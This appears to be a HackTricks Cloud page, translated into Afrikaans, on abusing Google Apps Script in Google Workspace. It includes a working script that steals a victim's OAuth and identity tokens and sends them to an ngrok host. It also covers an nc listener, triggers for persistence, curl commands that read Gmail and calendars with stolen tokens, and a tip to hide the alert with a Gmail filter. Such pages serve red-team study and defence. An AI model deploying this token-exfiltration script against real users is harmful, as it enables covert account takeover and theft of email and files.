# GWS - App Skrips

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## App Skrips

App Skrips is **kode wat geaktiveer sal word wanneer 'n gebruiker met redakteurstoestemming die dokument waar die App Skrip aan gekoppel is, toegang** en na die **aanvaarding van die OAuth-prompt**.\
Hulle kan ook ingestel word om **elke sekere tyd uitgevoer te word** deur die eienaar van die App Skrip (Volharding).

### Skep App Skrip

Daar is verskeie maniere om 'n App Skrip te skep, alhoewel die mees algemene maniere is **van 'n Google-dokument (van enige tipe)** en as 'n **losstaande projek**:

<details>

<summary>Skep 'n projek wat aan 'n houer gekoppel is vanuit Google Docs, Sheets of Slides</summary>

1. Maak 'n Docs-dokument, 'n Sheets-spreadsheet of 'n Slides-aanbieding oop.
2. Klik op **Extensions** > **Google Apps Script**.
3. In die skripskrywer, klik op **Untitled project**.
4. Gee jou projek 'n naam en klik op **Rename**.

</details>

<details>

<summary>Skep 'n losstaande projek</summary>

Om 'n losstaande projek vanuit Apps Script te skep:

1. Gaan na [`script.google.com`](https://script.google.com/).
2. Klik op **New Project**.
3. In die skripskrywer, klik op **Untitled project**.
4. Gee jou projek 'n naam en klik op **Rename**.

</details>

<details>

<summary>Skep 'n losstaande projek vanuit Google Drive</summary>

1. Maak [Google Drive](https://drive.google.com/) oop.
2. Klik op **New** > **More** > **Google Apps Script**.

</details>

<details>

<summary>Skep 'n projek wat aan 'n houer gekoppel is vanuit Google Forms</summary>

1. Maak 'n vorm in Google Forms oop.
2. Klik op More more\_vert > **Script editor**.
3. In die skripskrywer, klik op **Untitled project**.
4. Gee jou projek 'n naam en klik op **Rename**.

</details>

<details>

<summary>Skep 'n losstaande projek met behulp van die clasp-opdraglyninstrument</summary>

`clasp` is 'n opdraglyninstrument wat jou in staat stel om Apps Script-projekte vanuit 'n terminaal te skep, te trek/duw en te implementeer.

Sien die [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp) vir meer besonderhede.

</details>

## App Skrip Scenario <a href="#create-using-clasp" id="create-using-clasp"></a>

### Skep 'n Google-blad met App Skrip

Begin deur 'n App Skrip te skep, my aanbeveling vir hierdie scenario is om 'n Google-blad te skep en na **`Extensions > App Skrips`** te gaan, dit sal 'n **nuwe App Skrip vir jou oopmaak wat aan die blad gekoppel is**.

### Lek token

Om toegang tot die OAuth-token te gee, moet jy op **`Services +` klik en scopes byvoeg soos**:

* **AdminDirectory**: Toegang tot gebruikers en groepe van die gids (as die gebruiker genoeg toestemmings het)
* **Gmail**: Om toegang tot Gmail-data te verkry
* **Drive**: Om toegang tot Drive-data te verkry
* **Google Sheets API**: Sodat dit werk met die tigger

Om self die **nodige scopes** te verander, kan jy na projekinstellings gaan en **"appsscript.json" manifestl√™er in redakteur wys** inskakel.

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Om die versoek vas te vang, kan jy net die volgende uitvoer:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Toestemmings wat gevra word om die App Script uit te voer:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Aangesien 'n eksterne versoek gemaak word, sal die OAuth-aanvraag ook **toestemming vra om eksterne eindpunte te bereik**.
{% endhint %}

### Skep Trigger

Sodra die App gelees is, klik op **‚è∞ Triggers** om 'n trigger te skep. Kies as **funksie** om uit te voer **`getToken`**, voer uit by implementering **`Head`**, kies as gebeurtenisbron **`Vanaf sigblad`** en kies gebeurtenistipe **`By oopmaak`** of **`By wysiging`** (afhangende van jou behoeftes) en stoor.

Merk op dat jy die **uitvoer van die App Scripts in die Uitvoerings-tabblad** kan nagaan as jy iets wil foutopspoor.

### Deling

Om die **App Script** te **trigger**, moet die slagoffer verbind met **Redakteurstoegang**.

Opsommend, as die skepper en genooide gebruiker **uit dieselfde organisasie** is, sal die **OAuth-token** aan die **gebruiker** wat die l√™er benader, **behoort**.\
As hulle uit **verskillende organisasies** kom, sal die **token** aan die **skepper van die trigger** behoort, altyd met **slegs die OAuth-toestemmings wat gegee is** toe die trigger geskep is.

{% hint style="success" %}
Die **token** wat gebruik word om die **App Script** uit te voer, sal die een van die **skepper van die trigger** wees, selfs as die l√™er as Redakteur deur ander gebruikers geopen word.
{% endhint %}

### Misbruik van gedeelde dokumente

{% hint style="danger" %}
As iemand 'n dokument met App Scripts en 'n trigger wat die Hoof van die App Script gebruik, met jou gedeel het, kan jy die App Script-kode wysig (byvoorbeeld deur die steel token-funksies by te voeg), dit benader, en die **App Script sal uitgevoer word met die toestemmings van die gebruiker wat die dokument met jou gedeel het**! (merk op dat die eienaar se OAuth-token toegangsbereike sal h√™ soos diegene wat gegee is toe die trigger geskep is).

'n **Kennisgewing sal na die skepper van die skrip gestuur word om aan te dui dat iemand die skrip gewysig het** (Wat dink jy van die gebruik van gmail-toestemmings om 'n filter te genereer om die waarskuwing te voorkom?)
{% endhint %}

{% hint style="success" %}
As 'n **aanvaller die omvang van die App Script wysig**, sal die opdaterings **nie toegepas word** op die dokument totdat 'n **nuwe trigger** met die veranderinge geskep word nie. Daarom sal 'n aanvaller nie in staat wees om die eienaar se skepper-token te steel met meer omvang as die een wat hy in die trigger wat hy geskep het, ingestel het nie.
{% endhint %}

### Kopi√´ring in plaas van deling

Wanneer jy 'n skakel skep om 'n dokument te deel, word 'n skakel soortgelyk aan hierdie een geskep: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
As jy die einde **"/edit"** verander na **"/copy"**, sal Google jou vra of jy 'n **kopie van die dokument wil genereer:**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

As die gebruiker dit kopieer en dit benader, sal beide die **inhoud van die dokument en die App Scripts gekopieer** word, maar die **triggers nie nie**, daarom sal **niks uitgevoer word** nie.

### Deling as webtoepassing

Merk op dat dit ook moontlik is om 'n App Script as 'n webtoepassing te **deel** (in die Redakteur van die App Script, implementeer as 'n webtoepassing), maar 'n waarskuwing soos hierdie een sal verskyn:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Gevolg deur die **tipiese OAuth-aanvraag wat** vir die nodige toestemmings vra.

### Toetsing

Jy kan 'n ingesamelde token toets om e-posse te lys met:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lys kalender van die gebruiker:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script as Volharding

Een opsie vir volharding sou wees om 'n dokument te skep en 'n trekker vir die getToken-funksie by te voeg en die dokument met die aanvaller te deel, sodat elke keer as die aanvaller die l√™er oopmaak, hy die token van die slagoffer uitlek.

Dit is ook moontlik om 'n App Script te skep en dit elke X-tyd te laat trek (soos elke minuut, uur, dag...). 'n Aanvaller wat geloofsbriewe of 'n sessie van 'n slagoffer gekompromitteer het, kan 'n App Script tydtrekker instel en elke dag 'n baie bevoorregte OAuth-token uitlek:

Skep eenvoudig 'n App Script, gaan na Trekkers, klik op Voeg trekker by, en kies as gebeurtenisbron Tydgedrewe en kies die opsies wat jou die beste pas:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Dit sal 'n veiligheidswaarskuwingse-pos en 'n drukboodskap na jou selfoon skep om jou hiervan in kennis te stel.
{% endhint %}



### Gedeelde Dokument Ongeverifieerde Omsingeling Verbygaan

Verder, as iemand 'n dokument met redakteurstoegang met jou **gedeel** het, kan jy **App Scripts binne die dokument genereer** en die **EIENAAR (skepper) van die dokument sal die eienaar van die App Script wees**.

{% hint style="warning" %}
Dit beteken dat die **skepper van die dokument as skepper van enige App Script sal verskyn** wat enige iemand met redakteurstoegang binne dit skep.

Dit beteken ook dat die **App Script vertrou sal word deur die Workspace-omgewing** van die skepper van die dokument.
{% endhint %}

{% hint style="danger" %}
Dit beteken ook dat as 'n **App Script reeds bestaan** en mense **toegang verleen** het, enige iemand met **Redakteur**-toestemming op die dokument dit kan wysig en daardie toegang kan misbruik.\
Om hiervan misbruik te maak, het jy ook mense nodig om die App Script te aktiveer. En een slim truuk is om die skripsie as 'n webtoepassing te **publiseer**. Wanneer die **mense** wat reeds **toegang** tot die App Script verleen het, die webblad besoek, sal hulle die App Script **aktiveer** (dit werk ook deur gebruik te maak van `<img>`-etikette).
{% endhint %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks in PDF aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
